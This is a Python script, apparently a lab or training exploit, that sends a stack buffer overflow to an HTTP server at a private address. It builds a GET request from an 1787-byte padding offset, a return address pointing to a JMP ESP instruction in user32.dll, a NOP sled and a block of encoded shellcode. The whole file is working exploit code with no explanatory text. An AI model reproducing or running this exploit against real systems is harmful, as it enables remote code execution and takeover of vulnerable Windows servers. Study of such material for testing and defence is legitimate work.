#!/usr/bin/python

import os,sys,socket

ip = "192.168.1.9"
port = 80

# bad \x0d

offset = "A"*1787
eip = "\x53\x93\x42\x7E"  # user32.dll JMP ESP 7E429353
nops = "\x90"*30
shellcode =  ""
shellcode += "\xd9\xc8\xd9\x74\x24\xf4\x5a\x29\xc9\xb8\x45\x6b"
shellcode += "\x73\x7f\xb1\x52\x83\xea\xfc\x31\x42\x13\x03\x07"
shellcode += "\x78\x91\x8a\x7b\x96\xd7\x75\x83\x67\xb8\xfc\x66"
shellcode += "\x56\xf8\x9b\xe3\xc9\xc8\xe8\xa1\xe5\xa3\xbd\x51"
shellcode += "\x7d\xc1\x69\x56\x36\x6c\x4c\x59\xc7\xdd\xac\xf8"
shellcode += "\x4b\x1c\xe1\xda\x72\xef\xf4\x1b\xb2\x12\xf4\x49"
shellcode += "\x6b\x58\xab\x7d\x18\x14\x70\xf6\x52\xb8\xf0\xeb"
shellcode += "\x23\xbb\xd1\xba\x38\xe2\xf1\x3d\xec\x9e\xbb\x25"
shellcode += "\xf1\x9b\x72\xde\xc1\x50\x85\x36\x18\x98\x2a\x77"
shellcode += "\x94\x6b\x32\xb0\x13\x94\x41\xc8\x67\x29\x52\x0f"
shellcode += "\x15\xf5\xd7\x8b\xbd\x7e\x4f\x77\x3f\x52\x16\xfc"
shellcode += "\x33\x1f\x5c\x5a\x50\x9e\xb1\xd1\x6c\x2b\x34\x35"
shellcode += "\xe5\x6f\x13\x91\xad\x34\x3a\x80\x0b\x9a\x43\xd2"
shellcode += "\xf3\x43\xe6\x99\x1e\x97\x9b\xc0\x76\x54\x96\xfa"
shellcode += "\x86\xf2\xa1\x89\xb4\x5d\x1a\x05\xf5\x16\x84\xd2"
shellcode += "\xfa\x0c\x70\x4c\x05\xaf\x81\x45\xc2\xfb\xd1\xfd"
shellcode += "\xe3\x83\xb9\xfd\x0c\x56\x6d\xad\xa2\x09\xce\x1d"
shellcode += "\x03\xfa\xa6\x77\x8c\x25\xd6\x78\x46\x4e\x7d\x83"
shellcode += "\x01\xb1\x2a\x8a\xd9\x59\x29\x8c\xfb\xca\xa4\x6a"
shellcode += "\x91\xfc\xe0\x25\x0e\x64\xa9\xbd\xaf\x69\x67\xb8"
shellcode += "\xf0\xe2\x84\x3d\xbe\x02\xe0\x2d\x57\xe3\xbf\x0f"
shellcode += "\xfe\xfc\x15\x27\x9c\x6f\xf2\xb7\xeb\x93\xad\xe0"
shellcode += "\xbc\x62\xa4\x64\x51\xdc\x1e\x9a\xa8\xb8\x59\x1e"
shellcode += "\x77\x79\x67\x9f\xfa\xc5\x43\x8f\xc2\xc6\xcf\xfb"
shellcode += "\x9a\x90\x99\x55\x5d\x4b\x68\x0f\x37\x20\x22\xc7"
shellcode += "\xce\x0a\xf5\x91\xce\x46\x83\x7d\x7e\x3f\xd2\x82"
shellcode += "\x4f\xd7\xd2\xfb\xad\x47\x1c\xd6\x75\x77\x57\x7a"
shellcode += "\xdf\x10\x3e\xef\x5d\x7d\xc1\xda\xa2\x78\x42\xee"
shellcode += "\x5a\x7f\x5a\x9b\x5f\x3b\xdc\x70\x12\x54\x89\x76"
shellcode += "\x81\x55\x98"


buffer = offset + eip + nops + shellcode

request = "GET " + buffer + " HTTP/1.1\r\n\r\n"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((ip,port))
s.send(request)
s.close()
